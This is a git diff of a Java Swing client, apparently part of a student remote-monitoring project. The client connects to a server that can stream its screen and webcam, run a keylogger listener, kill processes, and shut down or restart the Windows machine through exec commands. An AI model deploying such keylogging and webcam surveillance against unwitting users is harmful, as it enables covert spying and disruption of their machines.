@@ -37,7 +37,7 @@ public class UIClient extends JFrame {
     private JTextField ipField;//ô nhập ip của server 
     private JTextField portField;//ô nhập port của server
     private JButton connectButton;//nút bấm connect
-    private JLabel statusLabel;//hiển thị trạng thái kết nối với server
+    private JLabel statusLabel; // hiển thị trạng thái kết nối với server
 
     private void startKeyloggerListener() {
         int port = ClientConfig.getInt("keylog_port", 1416);
@@ -59,6 +59,7 @@ public class UIClient extends JFrame {
             }
         }, "Keylog-Listener").start();
     }
+
     private void handleKeylogSession(Socket session) {
         KeyloggerService keyloggerService = null;
  
@@ -100,64 +101,6 @@ public class UIClient extends JFrame {
         }
     }
 
-    private void startServerMessageListener() {
-    new Thread(() -> {
-        try {
-            while (socketClient != null && socketClient.isConnected()) {
-                String message = socketClient.getDis().readUTF();
-
-                if (message.startsWith("BROADCAST|")) {
-                    String text = message.substring("BROADCAST|".length());
-
-                    SwingUtilities.invokeLater(() -> {
-                        JOptionPane.showMessageDialog(
-                                UIClient.this,
-                                text,
-                                "Broadcast Message",
-                                JOptionPane.INFORMATION_MESSAGE
-                        );
-                    });
-                } else if (message.startsWith("POWER|")) {
-                    String cmdType = message.substring("POWER|".length());
-                    System.out.println("[CLIENT] Nhận lệnh điều khiển nguồn: " + cmdType);
-                    executePowerCommand(cmdType);
-                }
-            }
-        } catch (Exception e) {
-            System.out.println("[CLIENT] Dừng nhận tin nhắn từ server.");
-        }
-    }).start();
-}
-
-    private void executePowerCommand(String type) {
-        try {
-            String os = System.getProperty("os.name").toLowerCase();
-            if (os.contains("win")) {
-                switch (type) {
-                    case "LOCK":
-                        Runtime.getRuntime().exec("rundll32.exe user32.dll,LockWorkStation");
-                        break;
-                    case "RESTART":
-                        Runtime.getRuntime().exec("shutdown /r /t 0");
-                        break;
-                    case "SHUTDOWN":
-                        Runtime.getRuntime().exec("shutdown /s /t 0");
-                        break;
-                    case "SLEEP":
-                        Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
-                        break;
-                    default:
-                        System.out.println("[CLIENT] Lệnh nguồn không hợp lệ: " + type);
-                        break;
-                }
-            } else {
-                System.out.println("[CLIENT] Chỉ hỗ trợ điều khiển nguồn trên hệ điều hành Windows.");
-            }
-        } catch (Exception e) {
-            System.out.println("[CLIENT LỖI] Lỗi thực thi lệnh điều khiển nguồn: " + e.getMessage());
-        }
-    }
-
     public UIClient() {
         setTitle(titleString);
         setSize(width,height);
@@ -172,6 +115,16 @@ public class UIClient extends JFrame {
         add(Center(),BorderLayout.CENTER);
         add(Footer(),BorderLayout.SOUTH);
     }
+
+    private String getClientId() {
+    try {
+        String hostname = java.net.InetAddress.getLocalHost().getHostName();
+        String ip = java.net.InetAddress.getLocalHost().getHostAddress();
+        return hostname + "-" + ip;
+    } catch (Exception e) {
+        return "UNKNOWN";
+    }
+}
 
     // 1. KHU VỰC HEADER (Tiêu đề)
     private JPanel Header() {
@@ -322,7 +275,6 @@ public class UIClient extends JFrame {
 
                         Screen screenStreamService = new Screen(socketClient.getDos());
                         screenStreamService.start();
-                        
                         startKeyloggerListener();
                     } else {
                         statusLabel.setText("● STATUS: CONNECTION FAILED!");
@@ -410,6 +362,95 @@ public class UIClient extends JFrame {
         label.setForeground(TEXT);
         label.setFont(new Font("Segoe UI", Font.PLAIN, 13));
         return label;
+    }
+
+    private void startServerMessageListener() {
+        new Thread(() -> {
+            try {
+                while (socketClient != null && socketClient.isConnected()) {
+                    String message = socketClient.getDis().readUTF();
+                    System.out.println("[CLIENT] Received: " + message);
+
+                    if (message.startsWith("BROADCAST|")) {
+                        String text = message.substring("BROADCAST|".length());
+                        SwingUtilities.invokeLater(() -> {
+                            JOptionPane.showMessageDialog(UIClient.this, text, "Broadcast", JOptionPane.INFORMATION_MESSAGE);
+                        });
+                    } else if (message.startsWith("POWER|")) {
+                        String cmdType = message.substring("POWER|".length());
+                        System.out.println("[CLIENT] Nhận lệnh điều khiển nguồn: " + cmdType);
+                        executePowerCommand(cmdType);
+                    }
+                    else if (message.equals("WEBCAM_START")) {
+                        new Thread(() -> {
+                            try {
+                                Socket ws = new Socket(socketClient.getServerIp(), 1413);
+                                DataOutputStream dos = new DataOutputStream(ws.getOutputStream());
+                                dos.writeUTF(socketClient.getClientName());
+                                dos.flush();
+                                new features.WebcamClientDemo().startWebcamStream(ws);
+                            } catch (Exception ex) {
+                                System.out.println("[WEBCAM-CLIENT] ERROR: " + ex.getMessage());
+                            }
+                        }).start();
+                    }
+                    else if (message.equals("TASK_MANAGER_START")) {
+                        new Thread(() -> {
+                            try {
+                                Socket ts = new Socket(socketClient.getServerIp(), 1414);
+                                DataOutputStream dos = new DataOutputStream(ts.getOutputStream());
+                                dos.writeUTF(socketClient.getClientName());
+                                dos.flush();
+                                features.taskmanager.TaskCommandHandler handler = new features.taskmanager.TaskCommandHandler(ts);
+                                new Thread(handler).start();
+                            } catch (Exception ex) {
+                                System.out.println("[TASK-CLIENT] ERROR: " + ex.getMessage());
+                            }
+                        }).start();
+                    }
+                    else if (message.equals("GET_PROCESS_LIST")) {
+                        System.out.println("[CLIENT] Server requesting process list");
+                    }
+                    else if (message.startsWith("KILL_PROCESS|")) {
+                        String pid = message.substring("KILL_PROCESS|".length());
+                        new features.taskmanager.ProcessService().killProcess(pid);
+                    }
+                    else {
+                        System.out.println("[CLIENT] Unknown: " + message);
+                    }
+                }
+            } catch (Exception e) {
+                System.out.println("[CLIENT] Stopped: " + e.getMessage());
+            }
+        }).start();
+    }
+    private void executePowerCommand(String type) {
+        try {
+            String os = System.getProperty("os.name").toLowerCase();
+            if (os.contains("win")) { // Kiểm tra nếu máy khách chạy Windows
+                switch (type) {
+                    case "LOCK":
+                        Runtime.getRuntime().exec("rundll32.exe user32.dll,LockWorkStation");
+                        break;
+                    case "RESTART":
+                        Runtime.getRuntime().exec("shutdown /r /t 0");
+                        break;
+                    case "SHUTDOWN":
+                        Runtime.getRuntime().exec("shutdown /s /t 0");
+                        break;
+                    case "SLEEP":
+                        Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
+                        break;
+                    default:
+                        System.out.println("[CLIENT] Lệnh nguồn không hợp lệ: " + type);
+                        break;
+                }
+            } else {
+                System.out.println("[CLIENT] Chỉ hỗ trợ điều khiển nguồn trên Windows.");
+            }
+        } catch (Exception e) {
+            System.out.println("[CLIENT LỖI] Lỗi thực thi lệnh điều khiển nguồn: " + e.getMessage());
+        }
     }
 
     // Hàm Main khởi động để test thử UI
